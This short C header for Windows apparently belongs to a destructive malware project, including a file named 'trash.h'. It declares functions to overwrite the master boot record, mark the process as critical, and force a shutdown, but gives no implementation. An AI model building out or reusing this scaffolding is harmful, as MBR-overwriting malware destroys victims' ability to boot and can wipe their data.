#pragma once
#include "trash.h"

VOID
WINAPI
OverrideMBR(VOID);

BOOL
WINAPI
SetProcessCritical(VOID);

BOOL
WINAPI
ForceShutdownComputer(VOID);

#define NUM_ACES 2

typedef enum _SHUTDOWN_ACTION
{
    ShutdownNoReboot,
    ShutdownReboot,
    ShutdownPowerOff
} SHUTDOWN_ACTION, * PSHUTDOWN_ACTION;

BOOL
WINAPI
ForceShutdownComputer(VOID);